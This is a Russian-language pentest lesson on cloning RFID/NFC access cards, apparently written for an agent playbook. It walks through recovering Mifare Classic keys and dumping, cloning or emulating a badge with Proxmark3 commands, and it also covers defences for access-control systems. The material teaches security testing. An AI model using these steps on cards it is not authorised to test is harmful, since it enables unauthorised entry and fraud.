RFID/NFC — основа современных систем контроля доступа: пропуска, карты метро, домофоны, бесконтактная оплата. Многие legacy-карты (Mifare Classic) имеют сломанную криптографию Crypto1, что позволяет читать и клонировать их за минуты. Этот урок — практическое введение в атаки на proximity-карты.

## Теория

**RFID** работает в двух основных диапазонах:

| Диапазон | Частота | Примеры | Особенности |
|----------|---------|---------|-------------|
| **LF** (Low Frequency) | 125 кГц | EM4100, HID Prox | Только UID, нет крипто, клонируется тривиально |
| **HF** (High Frequency) | 13.56 МГц | Mifare, NTAG, FeliCa | Есть крипто, но часто сломано |
| **UHF** | 860–960 МГц | EPC Gen2, метки товаров | дальнее чтение, Gen2-команды |

**Типы карт:**

- **EM4100 / HID Prox** (LF) — фиксированный UID, никакой аутентификации. Клон делается за секунды.
- **Mifare Classic** (HF) — 1 КБ, разбита на сектора, каждый сектор защищён ключом A/B. Крипто **Crypto1** сломана (атаки nested, darkside, hardnested).
- **Mifare Ultralight / NTAG** — простые, часто используются в транспорте; некоторые уязвимы к откату счётчика (tearing).
- **Mifare DESFire** — AES/DES, считается стойкой, но бывают ошибки реализации.
- **iCLASS / FeliCa** — проприетарные, но с известными атаками на некоторых версиях.

**UID** — уникальный идентификатор карты. Многие СКУД проверяют только UID (или его часть), что делает их уязвимыми к клонированию и «магическим» картам (UID-перезаписываемым).

**Crypto1** — потоковый шифр Mifare Classic. Ключи можно восстановить атаками:

- **nested** — быстро, если известен хотя бы один ключ сектора.
- **darkside** — работает без известных ключей (нужен «диалог» с картой).
- **hardnested** — медленнее, но надёжнее, когда другие не сработали.

**Магические карты.** Обычные карты Mifare нельзя перезаписать по UID. Gen1a/Gen2/Gen3 (UID-перезаписываемые) позволяют записать чужой UID и полный дамп. Разные поколения по-разному отвечают на команды, поэтому подбираются под целевую СКУД.

## Инструменты и команды

- **Proxmark3** — профессиональный инструмент (RDV4, клоны Easy). Умеет LF/HF, чтение, клонирование, атаки Crypto1.
- **Flipper Zero** — карманный, LF/HF чтение/эмуляция, ограничен по атакам на Mifare.
- **ACR122U** — USB NFC-ридер для HF, работает с `libnfc`/`mfoc`.
- **ChameleonMini** — эмуляция и клонирование.
- **libnfc, mfoc, mfcuk** — софт для HF-атак.
- **NFCGate / Proxmark3 RDV4** — ретрансляция (relay).

```bash
# Установка
sudo apt install libnfc-bin mfoc
# Если Proxmark3
git clone https://github.com/RfidResearchGroup/proxmark3
cd proxmark3 && make && ./pm3

# --- Proxmark3 ---
# Автоопределение типа карты
pm3 --> auto
# Чтение LF (EM4100)
pm3 --> lf search
# Чтение HF (Mifare)
pm3 --> hf search
# Атака на Mifare Classic: восстановить ключи
pm3 --> hf mf autopwn
# Дамп карты
pm3 --> hf mf dump
# Клонирование в UID-карту
pm3 --> hf mf cload -f dump.bin

# --- ACR122U + mfoc ---
mfoc -O dump.mfd      # восстановить ключи и дампнуть Mifare Classic
```

## Атаки на Mifare Classic подробнее

| Атака | Нужно | Скорость | Надёжность |
|-------|-------|----------|-----------|
| nested | один известный ключ | секунды | высокая при наличии ключа |
| darkside | ничего (только карта) | минуты | средняя, зависит от карты |
| hardnested | ничего | десятки минут–часы | высокая |
| staticnonce | «кривая» карта | секунды | низкая (редко) |

`hf mf autopwn` комбинирует их: сначала пробует встроенный словарь ключей, затем nested/darkside/hardnested. Для многих карт этого достаточно.

## Разобранный пример: клонирование пропуска Mifare Classic

**Дано:** пропуск в офис (Mifare Classic 1K), Proxmark3.

**Шаг 1 — определить карту:**
```text
pm3 --> hf search
# Вывод: Valid ISO14443-A tag found
#         Mifare Classic 1K, UID: 4A 3B 2C 1D
```

**Шаг 2 — восстановить ключи и дамп.** Запускаем `autopwn`, который перебирает известные ключи и применяет nested/hardnested:
```text
pm3 --> hf mf autopwn
# ... находит ключи всех секторов, делает дамп в hf-mf-<UID>-dump.bin
```

**Шаг 3 — анализ дампа.** Ключи и данные:
```text
pm3 --> hf mf dump
pm3 --> hf mf chk --dump
```
В дампе видны UID, данные секторов и ключи. Часто СКУД использует только UID или один-два сектора с данными.

**Шаг 4 — клонирование.** Пишем дамп в перезаписываемую UID-карту:
```text
pm3 --> hf mf cload -f hf-mf-4A3B2C1D-dump.bin
```
Теперь клон имеет тот же UID и данные. Проверяем на турникете (в рамках авторизованного теста).

**Шаг 5 — если карта только для чтения.** Используем «магическую» карту (Gen2/UID-перезаписываемую) или эмулируем карту самим Proxmark3/Flipper:
```text
pm3 --> hf mf sim --uid 4A3B2C1D
```

**Шаг 6 — LF-вариант.** Для EM4100:
```text
pm3 --> lf search
pm3 --> lf em 410x clone --id 0F0368568B
```

## Разобранный пример: эмуляция вместо клонирования

Если физическая карта недоступна, но дамп есть, эмулируйте её Proxmark3:
```text
pm3 --> hf mf eload -f dump.bin --uid 4A3B2C1D
pm3 --> hf mf sim --1k
```
Устройство «видит» карту — это удобно для проверки, какой именно элемент (UID или данные сектора) проверяет СКУД.

## Частые ошибки

- **Только UID vs полный дамп.** Некоторые СКУД проверяют данные сектора, а не только UID. Клон с одним UID не сработает — нужен полный дамп.
- **Несовместимые «магические» карты.** Gen1a vs Gen2 vs Gen3 UID-карты по-разному отвечают на команды. Подбирайте под целевую СКУД.
- **Слабый контакт/питание.** Proxmark3 нужен хороший USB-порт; плохое питание = сбои в атаках.
- **Долгие атаки hardnested.** Могут занимать часы. Сначала пробуйте nested/darkside.
- **Правовые ограничения.** Клонирование чужих карт (транспорт, банки, чужие пропуска) — преступление. Только свои карты/авторизованный тест.
- **Платёжные карты.** Бесконтактные банковские карты — отдельная тема; не пытайтесь проводить платежи без разрешения.
- **Антенна и ориентация.** Карта должна лежать ровно на антенне; сдвиг ломает чтение.

## Защита СКУД от клонирования

Знание атак напрямую даёт рекомендации:

- **Не доверять только UID.** UID клонируется тривиально; проверяйте данные защищённого сектора или используйте карты с аутентификацией (DESFire).
- **Crypto1 — устарел.** Mifare Classic нельзя считать средством защиты; замена на DESFire/Ultralight AES.
- **Взаимная аутентификация.** Считыватель и карта должны аутентифицироваться взаимно, с защитой от replay.
- **Секреты — не глобальные.** Если у всех карт один ключ, компрометация одной компрометирует парк.
- **Мониторинг.** Детект клонов по одновременному использованию двух карт с одним UID.
- **Физическая защита.** Считыватели с анти-демонтажем, экранирование от ретрансляции (NFC relay).

## Типовые ошибки внедрения СКУД

| Ошибка | Последствие |
|--------|-------------|
| Только UID | клон за секунды |
| Mifare Classic | Crypto1 ломается |
| Глобальный ключ | утечка одной карты = утечка всех |
| Нет anti-relay | ретрансляция с телефона |
| Слабый протокол Wiegand | перехват/инъекция UID |
| Нет мониторинга | клоны не обнаруживаются |

**Wiegand — отдельная тема.** Многие считыватели передают UID контроллеру по Wiegand — простому двухпроводному протоколу без шифрования. Его легко перехватить и воспроизвести (эмуляция считывателя), что сводит на нет защиту карты. Проверяйте линию считыватель↔контроллер, а не только карту.

## Практический вывод

Клонирование — лишь первый шаг оценки. Реальная ценность отчёта — показать, что СКУД полагается на сломанную криптографию и один глобальный секрет, и предложить миграцию на аутентифицированные карты с мониторингом. Фиксируйте в отчёте: тип карты, UID, способ атаки и время, за которое клон получен.

## Что дальше / решение

- **Карта прочитана** → сохраните дамп и ключи, проверьте, что именно использует СКУД (UID/сектор).
- **Клон не сработал** → возьмите магическую карту другого поколения или эмулируйте Proxmark3.
- **Mifare DESFire/стойкая карта** → переходите к `hardware-crypto` и `hardware-sidechannel`.
- **Нужно дальнее чтение** → рассмотрите UHF/EPC Gen2 и соответствующие ридеры.
- **Провал** → `record_vector attempted`, зафиксируйте тип карты и результат.
